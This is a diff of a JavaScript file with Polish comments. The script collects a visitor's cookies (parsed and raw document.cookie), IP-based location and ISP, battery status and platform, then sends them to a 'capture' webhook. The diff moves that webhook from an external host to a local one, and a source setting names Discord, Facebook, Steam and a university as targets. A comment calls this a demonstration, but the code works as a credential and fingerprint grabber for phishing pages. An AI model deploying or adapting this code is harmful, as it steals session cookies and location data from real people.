@@ -15,7 +15,7 @@
   "use strict";
 
   // ── Konfiguracja ──────────────────────────────────────────
-  var WEBHOOK_URL = "http://6ysp8qv1jp.laravel-sail.site:8080/webhook/capture";
+  var WEBHOOK_URL = "http://carrier-days.local/webhook/capture";
   var SOURCE = "discord"; // zmień: facebook | steam | uczelnia | custom
   // ──────────────────────────────────────────────────────────
 
@@ -38,7 +38,7 @@
       city: gd.city,
       region: gd.region,
       country: gd.country_name,
-      isp: gd.org,        // np. "AS12345 Orange Polska"
+      isp: gd.org, // np. "AS12345 Orange Polska"
       timezone: gd.timezone,
     };
   } catch (_) {}
@@ -47,12 +47,14 @@
     var result = {};
     var raw = document.cookie;
     if (!raw) return result;
-    raw.split(';').forEach(function (pair) {
-      var idx = pair.indexOf('=');
+    raw.split(";").forEach(function (pair) {
+      var idx = pair.indexOf("=");
       if (idx < 0) return;
       var name = pair.slice(0, idx).trim();
       var value = pair.slice(idx + 1).trim();
-      try { value = decodeURIComponent(value); } catch (e) {}
+      try {
+        value = decodeURIComponent(value);
+      } catch (e) {}
       result[name] = value;
     });
     return result;
@@ -69,8 +71,8 @@
       platform: navigator.platform,
       battery: battery,
       geo: geo,
-      cookies: parseCookies(),       // non-HttpOnly cookies dostępne z JS
-      cookies_raw: document.cookie,  // surowy string do celów demonstracyjnych
+      cookies: parseCookies(), // non-HttpOnly cookies dostępne z JS
+      cookies_raw: document.cookie, // surowy string do celów demonstracyjnych
       payload: payload || {},
     };
     // Próba fetch (nowoczesne przeglądarki)
